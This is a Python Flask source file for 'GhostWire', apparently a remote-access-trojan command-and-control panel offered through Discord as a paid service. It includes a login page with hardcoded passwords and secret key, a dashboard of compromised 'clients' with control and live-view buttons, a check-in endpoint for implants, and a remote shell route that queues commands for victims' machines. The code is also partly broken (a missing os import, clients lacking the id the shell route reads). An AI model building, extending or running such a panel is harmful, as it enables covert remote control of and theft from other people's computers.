import socket
import requests
import psutil
import time
import platform
from functools import wraps
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)



app.secret_key = '24208880&&&*%^^&*&)*)(*)JHGJHFJ'

USERS = {
    "taktikal": "4347",
    "admin": "adminpass123",
    "khunshu": "bruh"
}
commands_queue = {}
command_outputs = {}
connected_clients = []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if USERS.get(username) == password:
            session['logged_in'] = True
            return redirect(url_for('home'))
        else:
            error = "Invalid username or password"

    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>GhostWire Login</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
            html, body {{
                margin: 0;
                padding: 0;
                font-family: 'Inter', sans-serif;
                height: 100%;
                overflow: hidden;
            }}
            body {{
                background: #0a0a23;
                display: flex;
                justify-content: center;
                align-items: center;
            }}
            .background {{
                position: fixed;
                width: 100%;
                height: 100%;
                background: radial-gradient(circle at center, #1e0036, #0a0a23);
                overflow: hidden;
                z-index: -1;
            }}
            canvas {{
                position: absolute;
                width: 100%;
                height: 100%;
            }}
            .login-container {{
                background-color: #111222;
                border-radius: 16px;
                padding: 40px 30px;
                width: 340px;
                box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
                color: white;
                z-index: 1;
            }}
            .login-container h2 {{
                font-size: 28px;
                text-align: center;
                margin-bottom: 10px;
            }}
            .login-container p {{
                font-size: 14px;
                text-align: center;
                color: #aaa;
                margin-bottom: 30px;
            }}
            .login-container label {{
                display: block;
                font-weight: 600;
                margin-bottom: 5px;
                margin-top: 15px;
            }}
            .login-container input {{
                width: 100%;
                padding: 12px;
                border: none;
                border-radius: 8px;
                background: #1f1f2e;
                color: white;
                font-size: 14px;
            }}
            .login-container input::placeholder {{
                color: #777;
            }}
            .login-container input[type=submit] {{
                margin-top: 25px;
                background: linear-gradient(90deg, #6f4ef2, #9b5cf3);
                font-weight: bold;
                cursor: pointer;
            }}
            .login-container input[type=submit]:hover {{
                background: linear-gradient(90deg, #5e3ee0, #854af2);
            }}
            .login-container .links {{
                font-size: 13px;
                margin-top: 20px;
                text-align: center;
                color: #888;
            }}
            .login-container .links a {{
                color: #7869ff;
                text-decoration: none;
                font-weight: 500;
            }}
            .login-container .error {{
                color: #ff4d4d;
                text-align: center;
                margin-bottom: 10px;
                font-weight: bold;
            }}
        </style>
    </head>
    <body>
        <div class="background">
            <canvas id="bg-canvas"></canvas>
        </div>
        <form class="login-container" method="POST">
            <h2>GhostWire</h2>
            <p>Access your premium account or join our Discord community for subscriptions</p>
            {f'<div class="error">{error}</div>' if error else ''}
            <label>Username</label>
            <input type="text" name="username" placeholder="Enter your username" required autofocus>
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="submit" value="Sign In">
            <div class="links">
    New to GhostWire? <a href="https://discord.gg/56M2wSgqzF" target="_blank" rel="noopener noreferrer">Join our Discord</a><br>
    <a href="https://t.me/taktikaltoaster" target="_blank" rel="noopener noreferrer">Forgot password?</a>
</div>

        </form>

        <script>
        // Basic animated background using particles
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        for (let i = 0; i < 100; i++) {{
            particles.push({{
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 2 + 1,
                dx: (Math.random() - 0.5) * 0.5,
                dy: (Math.random() - 0.5) * 0.5
            }});
        }}

        function animate() {{
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let p of particles) {{
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = "#8a2be2";
                ctx.fill();
                p.x += p.dx;
                p.y += p.dy;
                if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
            }}
            requestAnimationFrame(animate);
        }}
        animate();
        </script>
    </body>
    </html>
    '''

@app.route('/home')
@login_required
def home():
    try:
        name = platform.node()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        public_ip = requests.get("https://api.ipify.org").text
        path = os.getcwd()
        last_seen = time.strftime("%Y-%m-%d %H:%M:%S")

        if not any(c["ip"] == ip and c["name"] == name for c in connected_clients):
            connected_clients.append({
                "name": name,
                "ip": ip,
                "public_ip": public_ip,
                "path": path,
                "status": "online",
                "last_seen": last_seen
            })

    except Exception as e:
        print(f"Client check failed: {e}")

    for c in connected_clients:
        c.setdefault("status", "online")
        c.setdefault("public_ip", "N/A")
        c.setdefault("path", "/")
        c.setdefault("last_seen", "-")

    uptime_seconds = int(time.time() - psutil.boot_time())
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))

    html_clients = ""
    for c in connected_clients:
        html_clients += f"""
        <div class="client-card">
            <div class="client-header">
                <span class="client-icon">🖥️</span>
                <span class="client-name">{c['name']}</span>
                <span class="status-indicator {'online' if c['status'] == 'online' else 'offline'}">
                    {'🟢 ONLINE' if c['status'] == 'online' else '🔴 OFFLINE'}
                </span>
            </div>
            <div class="client-info"><span>📍 Local IP:</span> {c['ip']}</div>
            <div class="client-info"><span>🌐 Public IP:</span> {c['public_ip']}</div>
            <div class="client-info"><span>📁 Path:</span> {c['path']}</div>
            <div class="client-info"><span>⏱ Last Seen:</span> {c['last_seen']}</div>
            <div class="btn-group">
                <a href="/control" class="btn control">🔴 CONTROL</a>
                <a href="/shell" class="btn console">🧮 CONSOLE</a>
                <a href="/live" class="btn view">📺 LIVE VIEW</a>
            </div>
        </div>
        """

    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>GhostWire Panel</title>
        <style>
            html, body {{
                margin: 0;
                padding: 0;
                height: 100%;
                font-family: 'Segoe UI', sans-serif;
                overflow: hidden;
            }}
            body {{
                background: #0a0a23;
            }}
            .background {{
                position: fixed;
                width: 100%;
                height: 100%;
                background: radial-gradient(circle at center, #1e0036, #0a0a23);
                overflow: hidden;
                z-index: -1;
            }}
            canvas {{
                position: absolute;
                width: 100%;
                height: 100%;
            }}
            .topbar {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 20px 30px;
                background: #111121cc;
                border-bottom: 2px solid #ff00cc33;
            }}
            .topbar .logo {{
                font-size: 24px;
                font-weight: bold;
                color: #ff00cc;
            }}
            .stats {{
                display: flex;
                gap: 15px;
            }}
            .stat-box {{
                background: #1a1a2ecc;
                padding: 10px 15px;
                border-radius: 8px;
                font-size: 12px;
                color: #aaa;
                text-align: center;
            }}
            .grid-toggle {{
                background: #1e1e2ecc;
                padding: 8px 16px;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                margin: 15px;
                display: inline-block;
            }}
            .container {{
                display: flex;
                justify-content: center;
                padding: 30px;
                flex-wrap: wrap;
            }}
            .client-card {{
                background: #11111dcc;
                border-radius: 16px;
                padding: 20px;
                width: 340px;
                box-shadow: 0 0 20px #d400ff33;
                margin: 20px;
            }}
            .client-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }}
            .client-name {{
                font-weight: bold;
                font-size: 20px;
            }}
            .status-indicator {{
                font-size: 12px;
                padding: 4px 10px;
                border-radius: 20px;
                background: #222;
                color: #0f0;
            }}
            .status-indicator.offline {{
                color: #f55;
            }}
            .client-info {{
                background: #1a1a2acc;
                padding: 10px 15px;
                border-radius: 8px;
                margin: 8px 0;
                font-size: 14px;
                color: #ccc;
            }}
            .client-info span {{
                font-weight: bold;
                margin-right: 6px;
                color: #eee;
            }}
            .btn-group {{
                display: flex;
                justify-content: space-between;
                margin-top: 20px;
            }}
            .btn {{
                text-decoration: none;
                padding: 10px 16px;
                border-radius: 8px;
                font-size: 13px;
                font-weight: bold;
                color: white;
                text-align: center;
                flex: 1;
                margin: 0 4px;
            }}
            .btn.control {{ background: #ff0077; }}
            .btn.console {{ background: #00aaff; }}
            .btn.view {{ background: #a64dff; }}
        </style>
    </head>
    <body>
        <div class="background">
            <canvas id="bg-canvas"></canvas>
        </div>

        <div class="topbar">
            <div class="logo">👻 GhostWire</div>
            <div class="stats">
                <div class="stat-box">⏱ {uptime_str}<br>SERVER UPTIME</div>
                <div class="stat-box">🟢 {len(connected_clients)}<br>ACTIVE CLIENTS</div>
                <div class="stat-box">🔴 0<br>OFFLINE CLIENTS</div>
                <div class="stat-box">🆕 1<br>NEW CLIENTS (24H)</div>
            </div>
        </div>
        <div class="grid-toggle">🔲 Grid</div>
        <div class="container">
            {html_clients}
        </div>

        <script>
        // Particle canvas animation
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        for (let i = 0; i < 100; i++) {{
            particles.push({{
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 2 + 1,
                dx: (Math.random() - 0.5) * 0.5,
                dy: (Math.random() - 0.5) * 0.5
            }});
        }}

        function animate() {{
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let p of particles) {{
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = "#8a2be2";
                ctx.fill();
                p.x += p.dx;
                p.y += p.dy;
                if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
            }}
            requestAnimationFrame(animate);
        }}
        animate();
        </script>
    </body>
    </html>
    """

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        name = data.get('name')
        ip = data.get('ip')
        last_seen = data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))
        
        # Check if client is already registered
        existing = next((c for c in connected_clients if c['ip'] == ip and c['name'] == name), None)
        if existing:
            existing['last_seen'] = last_seen
            existing['status'] = 'online'
        else:
            connected_clients.append({
                'name': name,
                'ip': ip,
                'public_ip': 'N/A',  # You can improve to get real public IP if you want
                'path': '/',
                'status': 'online',
                'last_seen': last_seen
            })
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(f"Error in /register: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    
@app.route('/shell', methods=['GET', 'POST'])
@login_required
def remote_shell():
    output = ""
    selected_client_id = request.args.get("client_id", "")
    
    if request.method == 'POST':
        command = request.form.get('cmd')
        selected_client_id = request.form.get('client_id', selected_client_id)
        if command and selected_client_id:
            # Removed log_action line as requested
            commands_queue.setdefault(selected_client_id, []).append(command)
            output = command_outputs.get(selected_client_id, "")

    client_options = "".join(
        f'<option value="{c["id"]}" {"selected" if c["id"]==selected_client_id else ""}>{c["name"]} ({c["ip"]})</option>'
        for c in connected_clients
    )
    
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>GhostWire - Remote Shell</title>
        <style>
            html, body {{
                margin: 0;
                padding: 0;
                height: 100%;
                font-family: 'Segoe UI', sans-serif;
                overflow: hidden;
                background: #0a0a23;
            }}
            .background {{
                position: fixed;
                width: 100%;
                height: 100%;
                background: radial-gradient(circle at center, #1e0036, #0a0a23);
                overflow: hidden;
                z-index: -1;
            }}
            canvas {{
                position: absolute;
                width: 100%;
                height: 100%;
            }}
            .shell-container {{
                position: relative;
                z-index: 1;
                padding: 40px;
                max-width: 900px;
                margin: auto;
                margin-top: 60px;
                background: #111222dd;
                border-radius: 16px;
                box-shadow: 0 0 30px rgba(138, 43, 226, 0.3);
                color: white;
            }}
            h2 {{
                text-align: center;
                font-size: 26px;
                margin-bottom: 20px;
            }}
            form {{
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10px;
                flex-wrap: wrap;
            }}
            select, input[type="text"] {{
                padding: 12px;
                font-size: 15px;
                border-radius: 8px;
                border: none;
                background: #1f1f2e;
                color: white;
            }}
            select {{
                width: 25%;
                cursor: pointer;
            }}
            input[type="text"] {{
                width: 45%;
            }}
            input[type="submit"] {{
                padding: 12px 20px;
                border-radius: 8px;
                border: none;
                background: linear-gradient(90deg, #6f4ef2, #9b5cf3);
                color: white;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.2s ease;
                width: 20%;
            }}
            input[type="submit"]:hover {{
                background: linear-gradient(90deg, #5e3ee0, #854af2);
            }}
            pre {{
                background: #0f0f1f;
                padding: 20px;
                margin-top: 30px;
                border-radius: 10px;
                font-size: 14px;
                max-height: 400px;
                overflow-y: auto;
                white-space: pre-wrap;
                color: #ccc;
                width: 100%;
                box-sizing: border-box;
            }}
            .header {{
                text-align: center;
                font-size: 22px;
                padding: 15px;
                background: #15152a;
                border-bottom: 1px solid #333;
                color: #f0f;
                font-weight: bold;
            }}
        </style>
    </head>
    <body>
        <div class="background">
            <canvas id="bg-canvas"></canvas>
        </div>
        <div class="header">GhostWire | Remote Shell by x64dbd & тактический</div>
        <div class="shell-container">
            <h2>Remote Shell Access</h2>
            <form method="POST">
                <select name="client_id" onchange="this.form.submit()">
                    <option value="">-- Select Client --</option>
                    {client_options}
                </select>
                <input type="text" name="cmd" placeholder="Enter command" autocomplete="off" autofocus required>
                <input type="submit" value="Send">
            </form>
            <pre>{output}</pre>
        </div>

        <script>
        // Particle background animation
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        for (let i = 0; i < 100; i++) {{
            particles.push({{
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 2 + 1,
                dx: (Math.random() - 0.5) * 0.5,
                dy: (Math.random() - 0.5) * 0.5
            }});
        }}

        function animate() {{
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let p of particles) {{
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = "#8a2be2";
                ctx.fill();
                p.x += p.dx;
                p.y += p.dy;
                if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
            }}
            requestAnimationFrame(animate);
        }}
        animate();
        </script>
    </body>
    </html>
    '''
